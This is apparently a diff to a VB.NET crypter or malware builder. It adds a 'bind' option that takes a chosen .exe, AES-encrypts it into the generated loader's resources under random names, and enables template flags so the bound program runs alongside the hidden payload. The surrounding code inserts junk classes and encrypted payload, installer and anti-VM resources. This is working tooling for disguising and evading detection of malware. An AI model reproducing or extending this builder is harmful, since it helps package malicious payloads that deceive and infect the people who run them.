@@ -21,6 +21,17 @@ Public Class Form2
         Me.Hide()
     End Sub
 
+#Region "Bind"
+
+    Private Sub HuraButton1_Click(sender As Object, e As EventArgs) Handles HuraButton1.Click
+        Dim o As New OpenFileDialog
+        o.Filter = "Executable |*.exe"
+        If o.ShowDialog = DialogResult.OK Then
+            txtBind.Text = o.FileName
+        End If
+    End Sub
+
+#End Region
 
 #Region "Helper"
 
@@ -336,13 +347,14 @@ Public Class Form2
             Loader = Replace(Loader, "%JUNK3%", GenerateJunkClass(RandomNumber(1, 2)))
             Loader = Replace(Loader, "%JUNK4%", GenerateJunkClass(RandomNumber(1, 2)))
 
-            'Create DLL
+            'Creating files
             txtLog.Text = txtLog.Text.Insert(0, "Creating DLLs" + vbNewLine)
             Dim ResName As String = Randomi(rand.Next(4, 10))
             Dim ResPayload As String = Randomi(rand.Next(4, 10))
             Dim ResINS As String = Randomi(rand.Next(4, 10))
             Dim ResVM As String = Randomi(rand.Next(4, 10))
             Dim ResPE As String = Randomi(rand.Next(4, 10))
+            Dim ResBIND As String = Randomi(rand.Next(4, 10))
 
             Loader = Replace(Loader, "#PEdll", ResPE)
             Loader = Replace(Loader, "#PAYLOAD", ResPayload)
@@ -361,6 +373,17 @@ Public Class Form2
                 If chkInstall.Checked Then
                     R.AddResource(ResINS, AESEncrypt((My.Resources.INS), AESkey))
                 End If
+
+                If txtBind.Text <> "" Then
+                    R.AddResource(ResBIND, AESEncrypt((IO.File.ReadAllBytes(txtBind.Text)), AESkey))
+                    Loader = Replace(Loader, "'@BIND", Nothing)
+                    Loader = Replace(Loader, "#BINDdll", ResBIND)
+                    If chkBindOnce.Checked Then
+                        Loader = Replace(Loader, "'@ONCE", Nothing)
+                        Loader = Replace(Loader, "#ONCE", Randomi(rand.Next(4, 10)))
+                    End If
+                End If
+
                 R.Generate()
             End Using
 
@@ -416,6 +439,7 @@ Public Class Form2
         End With
 
     End Function
+
 
 
 
